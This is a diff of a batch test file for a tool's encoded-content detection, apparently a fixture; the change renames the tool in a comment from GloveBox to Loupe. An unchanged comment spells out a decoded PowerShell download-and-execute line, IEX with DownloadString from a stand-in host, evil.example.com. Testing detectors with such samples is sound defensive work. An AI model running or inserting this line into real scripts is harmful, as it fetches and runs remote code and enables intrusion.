@@ -1,5 +1,5 @@
 @echo off
-REM This is a test file for GloveBox encoded content detection.
+REM This is a test file for Loupe encoded content detection.
 REM The -EncodedCommand contains a Base64-encoded UTF-16LE PowerShell command.
 REM Decoded it says: IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/payload.ps1')
 
